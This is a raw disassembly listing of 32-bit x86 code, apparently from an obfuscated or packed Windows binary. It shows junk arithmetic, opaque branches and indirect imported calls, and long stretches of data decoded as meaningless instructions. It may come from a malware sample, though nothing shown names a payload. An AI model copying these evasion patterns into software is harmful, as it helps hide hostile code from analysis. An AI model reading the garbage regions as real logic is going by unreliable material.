  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428305
  40182a:	xor    DWORD PTR ds:0x428475,edx
  401830:	mov    edi,DWORD PTR ds:0x4283e5
  401836:	or     DWORD PTR ds:0x42847d,edi
  40183c:	or     DWORD PTR ds:0x4282f5,0x7336
  401846:	sbb    DWORD PTR ds:0x4283f9,0x42f3
  401850:	mov    DWORD PTR ds:0x428529,0x382b
  40185a:	inc    DWORD PTR ds:0x428531
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422530
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428415,0xc55
  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428411
  401886:	sbb    DWORD PTR ds:0x4283bd,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428519,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428429,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x4284fd
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x4282e9,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428519,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428115
  4018d1:	push   0x4281a1
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428401,0x428421
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428415,edx
  4018fa:	sub    DWORD PTR ds:0x42841d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x4283c9,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x4283c5
  401914:	mov    edx,DWORD PTR ds:0x4284a1
  40191a:	movzx  edx,WORD PTR ds:0x428529
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428515,0x405c
  401930:	cmp    DWORD PTR ds:0x4283c9,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428315
  401961:	adc    DWORD PTR ds:0x428511,ecx
  401967:	sub    DWORD PTR ds:0x428315,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428425,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x4283fd
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428505,edi
  401997:	mov    DWORD PTR ds:0x4283e9,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428425,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x4281f3
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x4282f1,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x4283f1
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x42848d,0x428519
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx+0x2083bae3]
  401a06:	sahf   
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi+0x44de67be]
  401a12:	mov    eax,DWORD PTR [esi-0x79]
  401a15:	ret    
  401a16:	or     ah,BYTE PTR [edx]
  401a18:	add    edx,DWORD PTR [esi-0x788134e1]
  401a1e:	js     0x401a11
  401a20:	arpl   WORD PTR [ebx+eiz*1-0x65dcd21],si
  401a27:	call   0xc7b2:0x92e45bd3
  401a2e:	addr16 mov ecx,0xba6b733e
  401a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a35:	push   0xba95f1c3
  401a3a:	jmp    0x59fd:0x7b334780
  401a41:	(bad)  
  401a42:	stc    
  401a43:	jae    0x401a07
  401a45:	xchg   ebp,eax
  401a46:	lods   al,BYTE PTR ds:[esi]
  401a47:	std    
  401a48:	aad    0xa1
  401a4a:	xchg   ecx,eax
  401a4b:	mov    bh,cl
  401a4d:	xchg   DWORD PTR [ebx-0x8a396d9],esi
  401a53:	push   esi
  401a54:	sbb    DWORD PTR [edx+0x2a6cf36c],ebp
  401a5a:	mov    ds:0xee8827a5,al
  401a5f:	bound  esi,QWORD PTR [esi+0x5e]
  401a62:	not    cl
  401a64:	pop    ecx
  401a65:	xchg   DWORD PTR fs:[esi+edi*2-0x13b07cdc],ebp
  401a6d:	mov    cl,0xc2
  401a6f:	add    al,0x81
  401a71:	test   ah,0xcc
  401a74:	xor    ch,BYTE PTR [esi+edx*2-0xe]
  401a78:	mov    ebx,0xf24005a6
  401a7d:	iret   
  401a7e:	ror    BYTE PTR [ebx+0x7c],0x91
  401a82:	test   al,0x93
  401a84:	fwait
  401a85:	je     0x401aaa
  401a87:	sub    al,0xdf
  401a89:	and    cl,BYTE PTR [edx+0x1c299619]
  401a8f:	neg    DWORD PTR [edx+0x3]
  401a92:	(bad)  
  401a93:	aas    
  401a94:	add    dl,bl
  401a96:	out    dx,al
  401a97:	inc    esp
  401a98:	xlat   BYTE PTR ds:[ebx]
  401a99:	mov    edx,cs
  401a9b:	adc    al,0x2c
  401a9d:	add    al,0xd3
  401a9f:	add    bx,di
  401aa2:	and    DWORD PTR [eax+0x78737b01],ecx
  401aa8:	and    BYTE PTR ds:0x558689a,ah
  401aae:	ror    ecx,cl
  401ab0:	jae    0x401aae
  401ab2:	push   0x35
  401ab4:	es ret 
  401ab6:	sahf   
  401ab7:	sbb    bh,ah
  401ab9:	test   BYTE PTR [ebp-0x33],bl
  401abc:	jmp    0x401a9a
  401abe:	sbb    eax,0x49c9bb3
  401ac3:	call   0x5f09705b
  401ac8:	push   cs
  401ac9:	loopne 0x401a69
  401acb:	cmc    
  401acc:	inc    esp
  401acd:	test   BYTE PTR [edx],0x1a
  401ad0:	mov    esp,0x91ef1986
  401ad5:	or     DWORD PTR [ecx+0x3b],eax
  401ad8:	jb     0x401b0b
  401ada:	add    al,0x69
  401adc:	sub    BYTE PTR [edi+0x12e33173],cl
  401ae2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  401ae4:	inc    ecx
  401ae5:	add    eax,DWORD PTR [eax]
  401ae7:	fist   DWORD PTR [edx]
  401ae9:	and    ah,cl
  401aeb:	fst    DWORD PTR [esi+0x3b]
  401aee:	mov    esp,0x15186f38
  401af3:	push   esi
  401af4:	mov    eax,ds:0x82eda6d9
  401af9:	jl     0x401b5a
  401afb:	test   al,0x6c
  401afd:	cwde   
  401afe:	scas   al,BYTE PTR es:[edi]
  401aff:	jle    0x401acc
  401b01:	aas    
  401b02:	sub    ecx,DWORD PTR [edi-0xa0be4fe]
  401b08:	mov    al,ds:0x88670226
  401b0d:	je     0x401ae8
  401b0f:	ret    0x5e3a
  401b12:	or     bl,cl
  401b14:	test   DWORD PTR [ebx-0x1a],ebp
  401b17:	mov    al,0xb6
  401b19:	lods   eax,DWORD PTR ds:[esi]
  401b1a:	cmp    BYTE PTR [ebx],ah
  401b1c:	pushf  
  401b1d:	test   eax,0x94e4c99e
  401b22:	push   esp
  401b23:	ret    0x9161
  401b26:	les    ebx,FWORD PTR ds:0x609d1047
  401b2c:	test   al,0x50
  401b2e:	test   DWORD PTR [eax-0x61],ebp
  401b31:	arpl   si,ax
  401b33:	dec    ebx
  401b34:	push   0xffffff9c
  401b36:	rcr    dh,1
  401b38:	jae    0x401b14
  401b3a:	or     al,BYTE PTR [ecx]
  401b3c:	xor    ecx,DWORD PTR [ebx]
  401b3e:	push   ebp
  401b3f:	in     eax,0x45
  401b41:	add    esi,0xd7f45ced
  401b47:	addr16 add eax,0x1a0be987
  401b4d:	and    DWORD PTR [ebp+0x67],esp
  401b50:	xchg   DWORD PTR [ecx+0x3f],ecx
  401b53:	xchg   BYTE PTR [ecx],bh
  401b55:	and    BYTE PTR [ecx-0x52],0xe0
  401b59:	rcr    BYTE PTR [esi-0x38],cl
  401b5c:	lahf   
  401b5d:	xchg   sp,ax
  401b5f:	mov    cl,0xd0
  401b61:	jl     0x401b08
  401b63:	or     DWORD PTR ds:0xcf27160c,esi
  401b69:	idiv   BYTE PTR ds:0x58aa8914
  401b6f:	sbb    dh,BYTE PTR [ebx-0x156db1df]
  401b75:	and    ah,BYTE PTR [esi-0xc]
  401b78:	dec    edx
  401b79:	add    al,0xd7
  401b7b:	jno    0x401b3d
  401b7d:	cmp    al,0xdb
  401b7f:	popa   
  401b80:	aas    
  401b81:	sbb    DWORD PTR [ebx],esi
  401b83:	imul   edx,edi,0xfffffffe
  401b86:	aad    0xcf
  401b88:	push   cs
  401b89:	sbb    ebx,DWORD PTR [ebx]
  401b8b:	js     0x401bee
  401b8d:	cmp    dh,BYTE PTR [eax+0x0]
  401b90:	adc    BYTE PTR [edi+eax*8+0x59],bl
  401b94:	or     edx,eax
  401b96:	mov    bh,0x79
  401b98:	and    eax,0x256265c0
  401b9d:	fdiv   DWORD PTR [eax+0x5458168e]
  401ba3:	or     ebp,esp
  401ba5:	mov    dh,0x52
  401ba7:	fimul  WORD PTR [edx+0x7da8710a]
  401bad:	dec    edi
  401bae:	out    0x17,eax
  401bb0:	mov    ds:0xbe34c9d6,al
  401bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bb6:	mov    BYTE PTR [eax+0x77],ah
  401bb9:	jne    0x401b8b
  401bbb:	or     ch,cl
  401bbd:	(bad)  
  401bbe:	dec    eax
  401bbf:	stos   BYTE PTR es:[edi],al
  401bc0:	cwde   
  401bc1:	mov    bh,0x3a
  401bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc4:	jge    0x401c43
  401bc6:	cmp    DWORD PTR [esi-0x76c4bfb0],ebp
  401bcc:	add    cl,dh
  401bce:	adc    al,0xe1
  401bd0:	test   edi,0x4de0d2b2
  401bd6:	in     al,dx
  401bd7:	in     eax,0xae
  401bd9:	lock jnp 0x401ba5
  401bdc:	mov    edi,0xe1bc9f7a
  401be1:	clc    
  401be2:	sbb    BYTE PTR [eax-0x48be6f7b],ah
  401be8:	add    edx,DWORD PTR [edi+0x5158371b]
  401bee:	outs   dx,BYTE PTR ds:[esi]
  401bef:	ja     0x401c36
  401bf1:	inc    eax
  401bf2:	popf   
  401bf3:	or     ebx,DWORD PTR [edx-0x7d]
  401bf6:	jl     0x401c32
  401bf8:	mov    esi,0xb6448b71
  401bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfe:	inc    eax
  401bff:	mov    ?,WORD PTR [ebp+0x6dabdbce]
  401c05:	nop
  401c06:	ror    DWORD PTR [esi],0x99
  401c09:	iret   
  401c0a:	sbb    BYTE PTR ds:0x84ee8e9d,0xc4
  401c11:	adc    ebp,DWORD PTR [ecx+0x3cd19fac]
  401c17:	jo     0x401bfa
  401c19:	jle    0x401bdc
  401c1b:	cmc    
  401c1c:	scas   eax,DWORD PTR es:[edi]
  401c1d:	shl    BYTE PTR [edi+0x20],0xa4
  401c21:	ror    DWORD PTR [edi+0x7259005b],cl
  401c27:	mov    ch,0x27
  401c29:	jp     0x401bc7
  401c2b:	loope  0x401c92
  401c2d:	test   BYTE PTR [eax-0x2f6b6172],ah
  401c33:	inc    ecx
  401c34:	repnz xchg esi,eax
  401c36:	xor    eax,0xbafc8745
  401c3b:	add    dh,BYTE PTR [ebx+0x33]
  401c3e:	xchg   ecx,eax
  401c3f:	ins    BYTE PTR es:[edi],dx
  401c40:	mov    bl,0x96
  401c42:	jmp    0x401bc6
  401c44:	inc    eax
  401c45:	xchg   dl,bh
  401c47:	ins    DWORD PTR es:[edi],dx
  401c48:	xchg   ebp,eax
  401c49:	xchg   ecx,eax
  401c4a:	cmp    eax,0x2aabd62b
  401c4f:	adc    BYTE PTR [edi],ch
  401c51:	jno    0x401cc9
  401c53:	rol    DWORD PTR [edi],cl
  401c55:	cmp    al,0x6
  401c57:	add    al,0x43
  401c59:	pushf  
  401c5a:	jno    0x401cb1
  401c5c:	pushf  
  401c5d:	and    BYTE PTR [edi],bh
  401c5f:	mov    bl,0x51
  401c61:	jo     0x401cac
  401c63:	xor    DWORD PTR [ebx+0x1721613],ebp
  401c69:	mov    WORD PTR [ecx],gs
  401c6b:	add    eax,0xc11e4c0d
  401c70:	pop    ss
  401c71:	daa    
  401c72:	lea    esi,[esi+0x53]
  401c75:	inc    edx
  401c76:	cmp    esp,0x48
  401c79:	pop    esi
  401c7a:	(bad)  
  401c7b:	push   eax
  401c7c:	cmp    ah,ah
  401c7e:	adc    bl,al
  401c80:	mov    edx,0x27532a65
  401c85:	lea    edx,[eax-0x19]
  401c88:	pushf  
  401c89:	push   edx
  401c8a:	mov    bh,0xc3
  401c8c:	daa    
  401c8d:	and    DWORD PTR [edx],0xffffff87
  401c90:	push   0xffffff98
  401c92:	xor    esp,ebp
  401c94:	push   esp
  401c95:	sbb    ebp,DWORD PTR [esp+ebx*2-0x3e]
  401c99:	std    
  401c9a:	xor    al,BYTE PTR [ebx]
  401c9c:	jge    0x401c49
  401c9e:	test   DWORD PTR [edi+0x487f0e89],ecx
  401ca4:	enter  0x7ef7,0xc9
  401ca8:	sbb    bl,BYTE PTR [ecx*1+0x1ccedfef]
  401caf:	addr16 icebp 
  401cb1:	or     BYTE PTR [ecx-0x216ba21e],dl
  401cb7:	(bad)  
  401cb8:	mov    ds:0x239abd37,al
  401cbd:	fisttp QWORD PTR [edi+ebp*2+0x41e6523d]
  401cc4:	scas   al,BYTE PTR es:[edi]
  401cc5:	push   ss
  401cc6:	and    esi,eax
  401cc8:	jno    0x401d44
  401cca:	pushf  
  401ccb:	fld    DWORD PTR [edx]
  401ccd:	ror    ah,cl
  401ccf:	dec    esi
  401cd0:	pop    esp
  401cd1:	inc    edx
  401cd2:	(bad)  
  401cd3:	fisub  WORD PTR [ebx]
  401cd5:	jp     0x401c96
  401cd7:	fdivp  st(4),st
  401cd9:	mov    edx,0x88ee0e6
  401cde:	xchg   edi,eax
  401cdf:	addr16 cli 
  401ce1:	js     0x401cd4
  401ce3:	ds and al,0x15
  401ce6:	or     al,0x60
  401ce8:	fiadd  WORD PTR [ecx-0x36]
  401ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cec:	add    al,0x24
  401cee:	jg     0x401cbf
  401cf0:	inc    edi
  401cf1:	pop    ecx
  401cf2:	add    DWORD PTR [esi],edi
  401cf4:	cmp    al,0xb7
  401cf6:	les    edi,FWORD PTR [ebp+0x2c0d806]
  401cfc:	adc    eax,0x255eb478
  401d01:	dec    ebp
  401d02:	push   es
  401d03:	cmp    al,0x57
  401d05:	loope  0x401ce7
  401d07:	jle    0x401c8d
  401d09:	mov    BYTE PTR [esi-0x58],dl
  401d0c:	pop    ebp
  401d0d:	pop    es
  401d0e:	test   eax,0x662d1d9b
  401d13:	mov    bh,0x31
  401d15:	jae    0x401d17
  401d17:	or     DWORD PTR [edi-0x70],0xb9470c06
  401d1e:	add    WORD PTR [eax+0x20797ed3],bx
  401d25:	(bad)  
  401d27:	rcl    DWORD PTR [eax+eiz*4-0x7f],1
  401d2b:	mov    dh,0xc0
  401d2d:	outs   dx,BYTE PTR ds:[esi]
  401d2e:	xchg   edi,eax
  401d2f:	lods   al,BYTE PTR ds:[esi]
  401d30:	in     al,dx
  401d31:	dec    edx
  401d32:	sbb    eax,0x4c990e70
  401d37:	dec    esp
  401d38:	sbb    BYTE PTR [ecx+0x1cf7e199],ah
  401d3e:	xchg   ebp,eax
  401d3f:	int3   
  401d40:	jnp    0x401cc7
  401d42:	push   0x1441c43f
  401d47:	in     al,0xc8
  401d49:	sahf   
  401d4a:	fs fwait
  401d4c:	pop    edx
  401d4d:	out    dx,al
  401d4e:	xchg   esi,eax
  401d4f:	mov    eax,ds:0x317d998
  401d54:	fwait
  401d55:	lahf   
  401d56:	xor    al,0xc9
  401d58:	or     DWORD PTR [eax+0x27281832],eax
  401d5e:	aam    0x67
  401d60:	xchg   ecx,eax
  401d61:	popf   
  401d62:	mov    ds:0xdb622948,al
  401d67:	cmp    al,0x68
  401d69:	sub    cl,BYTE PTR ds:0xd90b8599
  401d6f:	sar    BYTE PTR [eax-0x47],cl
  401d72:	into   
  401d73:	sub    al,0x39
  401d75:	lds    edi,FWORD PTR [eax+0xbad047a]
  401d7b:	inc    edi
  401d7c:	stos   BYTE PTR es:[edi],al
  401d7d:	fimul  WORD PTR [ebp-0x32]
  401d80:	and    BYTE PTR ds:0x8f5612dd,ah
  401d86:	mov    ds:0x6fae3acf,eax
  401d8b:	xchg   ebp,eax
  401d8c:	dec    ebx
  401d8d:	sub    bl,BYTE PTR [ecx+0x352f6b8b]
  401d93:	mov    DWORD PTR [ebp-0x70],0x2c55
  401d9a:	mov    DWORD PTR [ebp-0x6c],0x456f
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x4283d5,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42850d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x4283bd
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428321,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x4282fd
  401dfc:	and    DWORD PTR ds:0x428525,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x4283c5,0x0
  401e17:	mov    DWORD PTR ds:0x4284fd,0x646
  401e21:	mov    DWORD PTR ds:0x4283d5,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x4284a1
  401e37:	mov    DWORD PTR ds:0x4283c5,ebx
  401e3d:	cmp    DWORD PTR ds:0x4283c5,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x4281f3
  401e52:	push   0x4280f7
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x4284fd,0x4536
  401e6c:	sub    DWORD PTR ds:0x428485,edi
  401e72:	sbb    DWORD PTR ds:0x4283ed,0x4284fd
  401e7c:	add    DWORD PTR ds:0x428415,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428525,0x4283d5
  401e90:	adc    DWORD PTR ds:0x428519,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428509,0x4284f5
  401ea4:	add    DWORD PTR ds:0x4282f5,0x5dac
  401eae:	add    DWORD PTR ds:0x4282ed,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x4283e1,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x4284fd,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x428475
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428309
  401f03:	or     eax,DWORD PTR ds:0x4283e5
  401f09:	mov    ds:0x428309,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42850d,0x0
  401f1c:	mov    DWORD PTR ds:0x4282e5,0xd43
  401f26:	mov    DWORD PTR ds:0x428529,0x5a6d
  401f30:	mov    DWORD PTR ds:0x4283cd,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428425,edx
  401f46:	cmp    DWORD PTR ds:0x42850d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x4281e8
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x4283f5,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x4284a1,0xfa0
  401f82:	adc    DWORD PTR ds:0x428401,0x4282ed
  401f8c:	add    DWORD PTR ds:0x428309,0x428421
  401f96:	cmp    DWORD PTR ds:0x4284fd,0x0
  401f9d:	mov    DWORD PTR ds:0x428425,0x6252
  401fa7:	mov    DWORD PTR ds:0x428321,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428505,edx
  401fbc:	cmp    DWORD PTR ds:0x4284fd,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428115
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42830d,0x4284a9
  401fde:	sbb    DWORD PTR ds:0x4283e9,0x5068
  401fe8:	xor    DWORD PTR ds:0x4284a1,edi
  401fee:	and    DWORD PTR ds:0x428491,0x42852d
  401ff8:	xor    DWORD PTR ds:0x4284a9,0x428525
  402002:	add    DWORD PTR ds:0x4284f5,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428305,0x42847d
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x428485,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x4284ad,0x4282f9
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x4284b1,0x42848d
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428311,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	popf   
  40206e:	inc    esp
  40206f:	call   0xbdbe:0xbed2bde3
  402076:	les    edi,FWORD PTR [esi+0x38e195be]
  40207c:	xchg   edx,eax
  40207d:	stos   BYTE PTR es:[edi],al
  40207e:	sbb    BYTE PTR [eax+0x459326d0],bh
  402084:	out    dx,al
  402085:	fist   DWORD PTR [ecx+ebp*2]
  402088:	push   esp
  402089:	jbe    0x4020a2
  40208b:	cmp    ebx,esp
  40208d:	sub    cl,BYTE PTR [esp+ecx*8+0x6a6804ae]
  402094:	fwait
  402095:	jecxz  0x402067
  402097:	imul   esp,DWORD PTR [eax+0x5e],0xb974cc37
  40209e:	arpl   WORD PTR [esi-0x1c5d0958],bp
  4020a4:	jg     0x402028
  4020a6:	mov    al,0x9f
  4020a8:	mov    edx,0x29bbcfc3
  4020ad:	icebp  
  4020ae:	mov    bl,0xf5
  4020b0:	or     ecx,eax
  4020b2:	jmp    0x402037
  4020b4:	dec    edx
  4020b5:	cdq    
  4020b6:	cmp    ah,BYTE PTR [ecx+0x3bcbdbe3]
  4020bc:	push   esi
  4020bd:	xchg   ebp,eax
  4020be:	outs   dx,DWORD PTR ds:[esi]
  4020bf:	push   es
  4020c0:	iret   
  4020c1:	adc    edi,ebx
  4020c3:	(bad)  
  4020c4:	cdq    
  4020c5:	push   esi
  4020c6:	rol    BYTE PTR [di],cl
  4020c9:	dec    esi
  4020ca:	xlat   BYTE PTR ds:[ebx]
  4020cb:	repnz push ebp
  4020cd:	outs   dx,BYTE PTR ds:[esi]
  4020ce:	xchg   ebp,eax
  4020cf:	in     eax,0x81
  4020d1:	or     DWORD PTR [eax+0x4f],ecx
  4020d4:	and    bh,ch
  4020d6:	imul   ebp,DWORD PTR [eax-0x9],0xbf3686c9
  4020dd:	xchg   ebp,eax
  4020de:	jp     0x4020c4
  4020e0:	mov    edi,ebx
  4020e2:	out    dx,al
  4020e3:	rcl    eax,1
  4020e5:	mov    ebp,0xb719e156
  4020ea:	std    
  4020eb:	and    al,0x27
  4020ed:	arpl   WORD PTR [edi+0x8fa5084],dx
  4020f3:	mov    ds:0xd732bfad,eax
  4020f8:	mov    ds:0x528f4b21,al
  4020fd:	dec    ebp
  4020fe:	test   eax,0xc21c460a
  402103:	call   0x88a8f01b
  402108:	stos   DWORD PTR es:[edi],eax
  402109:	test   ecx,0x7aac90d8
  40210f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402110:	test   eax,0xbc9626e2
  402115:	pop    esi
  402116:	rol    esp,cl
  402118:	imul   eax,ebx,0xffd9127f
  40211e:	adc    BYTE PTR [ecx+0x3dce86b],bh
  402124:	fucom  st(5)
  402126:	cmc    
  402127:	pop    ss
  402128:	mov    esi,0xcdd8dee0
  40212d:	iret   
  40212e:	ja     0x4020b5
  402130:	test   eax,0x63898cc3
  402135:	jns    0x4020cd
  402137:	sahf   
  402138:	mov    ecx,0x2180ea39
  40213d:	clc    
  40213e:	or     DWORD PTR [ecx+0x2f],0x7cd23b6c
  402145:	daa    
  402146:	cdq    
  402147:	mov    ds:0xc55292e1,al
  40214c:	aaa    
  40214d:	ja     0x4021bc
  40214f:	mov    bh,0xd3
  402151:	jb     0x4021b0
  402153:	mov    ecx,eax
  402155:	dec    ebp
  402156:	nop
  402157:	popa   
  402158:	jle    0x402173
  40215a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215b:	fwait
  40215c:	mov    eax,ds:0x9dcd2feb
  402161:	dec    edx
  402162:	adc    eax,0xfd003868
  402167:	mov    gs,edi
  402169:	inc    edi
  40216a:	push   ds
  40216b:	fwait
  40216c:	jne    0x40215c
  40216e:	daa    
  40216f:	jne    0x4021b1
  402171:	imul   esp,DWORD PTR [esp+edx*8],0x978bdb5e
  402178:	inc    eax
  402179:	icebp  
  40217a:	in     eax,dx
  40217b:	mov    ah,0xa8
  40217d:	mov    BYTE PTR [eax+0x22070eb3],cl
  402183:	push   0x463e3e85
  402188:	retf   0x8d1c
  40218b:	es sub eax,0x29ad5e94
  402191:	inc    edi
  402192:	inc    BYTE PTR [edx]
  402194:	xchg   esi,eax
  402195:	mov    edi,0x892342bb
  40219a:	lock hlt 
  40219c:	shr    DWORD PTR [edi],cl
  40219e:	shl    DWORD PTR [edi+0x641ed3e9],0x1f
  4021a5:	cld    
  4021a6:	retf   
  4021a7:	rcl    DWORD PTR [ecx+0x48],cl
  4021aa:	ret    0x403b
  4021ad:	adc    DWORD PTR [ebx+0x6d],edi
  4021b0:	mov    bl,BYTE PTR [ebx+0x76]
  4021b3:	mov    dh,0x8d
  4021b5:	arpl   ax,sp
  4021b7:	aam    0x3
  4021b9:	out    dx,al
  4021ba:	sahf   
  4021bb:	lahf   
  4021bc:	push   ebx
  4021bd:	jmp    0x658:0x135d19b5
  4021c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c5:	mov    dh,al
  4021c7:	inc    ecx
  4021c8:	sub    bh,BYTE PTR [edi+edi*8+0x2f2de2e2]
  4021cf:	pop    ebp
  4021d0:	pop    ss
  4021d1:	pushf  
  4021d2:	push   esi
  4021d3:	xor    esi,DWORD PTR [esi+0x1b]
  4021d6:	mov    dl,0x76
  4021d8:	test   al,0xef
  4021da:	outs   dx,BYTE PTR ds:[esi]
  4021db:	cwde   
  4021dc:	arpl   bx,sp
  4021de:	mov    ebx,0xb3823bc4
  4021e3:	xor    DWORD PTR [edx+0x2e],ebx
  4021e6:	std    
  4021e7:	fucomp st(4)
  4021e9:	js     0x4021e9
  4021eb:	jge    0x40216d
  4021ed:	cmp    esp,DWORD PTR [ecx-0x42b55ef5]
  4021f3:	(bad)  
  4021f4:	jne    0x402210
  4021f6:	add    edx,DWORD PTR [edx]
  4021f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f9:	scas   eax,DWORD PTR es:[edi]
  4021fa:	jge    0x4021af
  4021fc:	jno    0x4021af
  4021fe:	jno    0x402250
  402200:	dec    esp
  402201:	test   BYTE PTR [esi-0x147cadc5],dh
  402207:	dec    ebp
  402208:	add    DWORD PTR [ecx],ecx
  40220a:	addr16 pop es
  40220c:	sub    bh,BYTE PTR [ebx]
  40220e:	push   ecx
  40220f:	jno    0x4021d6
  402211:	outs   dx,DWORD PTR ds:[esi]
  402212:	mov    dh,0xb4
  402214:	jbe    0x402196
